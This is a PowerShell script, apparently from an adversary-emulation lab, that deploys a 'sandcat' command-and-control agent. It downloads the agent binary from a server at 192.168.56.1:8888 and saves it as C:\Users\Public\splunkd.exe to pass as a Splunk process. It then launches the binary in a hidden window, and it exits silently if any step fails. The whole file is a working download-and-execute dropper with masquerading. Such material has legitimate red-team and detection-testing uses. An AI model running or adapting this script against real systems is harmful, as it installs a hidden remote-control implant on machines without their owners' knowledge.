<#
deploy.ps1
- Purpose: Deploy sandcat agent safely (idempotent)
- Behavior:
  1. If running as admin AND agent already running -> exit
  2. Else download agent and (re)deploy
#>

# =========================
# Config
# =========================
$Server = "http://192.168.56.1:8888"
$DownloadUrl = "$Server/file/download"
$AgentPath = "C:\Users\Public\splunkd.exe"
$AgentArgs = "-server $Server -group ttps6"

# =========================
# Helper: Admin check
# =========================
function Test-IsAdmin {
    try {
        $id = [Security.Principal.WindowsIdentity]::GetCurrent()
        $p  = New-Object Security.Principal.WindowsPrincipal($id)
        return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch {
        return $false
    }
}

# =========================
# Helper: Agent running check
# =========================
function Test-AgentRunning {
    try {
        Get-Process -ErrorAction SilentlyContinue |
            Where-Object {
                $_.Path -and ($_.Path -ieq $AgentPath)
            } |
            Select-Object -First 1
    } catch {
        return $null
    }
}

# =========================
# Guard: idempotent behavior
# =========================
if (Test-IsAdmin) {
    $agent = Test-AgentRunning
    if ($agent) {
        # Already admin + agent running → do nothing
        exit 0
    }
}

# =========================
# Download agent
# =========================
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("platform", "windows")
    $wc.Headers.Add("file", "sandcat.go")

    $data = $wc.DownloadData($DownloadUrl)
} catch {
    # Download failed → exit quietly
    exit 1
}

# =========================
# Stop existing agent (if any)
# =========================
try {
    Get-Process -ErrorAction SilentlyContinue |
        Where-Object {
            $_.Path -and ($_.Path -ieq $AgentPath)
        } |
        Stop-Process -Force -ErrorAction SilentlyContinue
} catch {}

# =========================
# Write agent binary
# =========================
try {
    Remove-Item -Force $AgentPath -ErrorAction SilentlyContinue
    [System.IO.File]::WriteAllBytes($AgentPath, $data) | Out-Null
} catch {
    exit 1
}

# =========================
# Execute agent
# =========================
try {
    Start-Process `
        -FilePath $AgentPath `
        -ArgumentList $AgentArgs `
        -WindowStyle Hidden
} catch {
    exit 1
}

exit 0

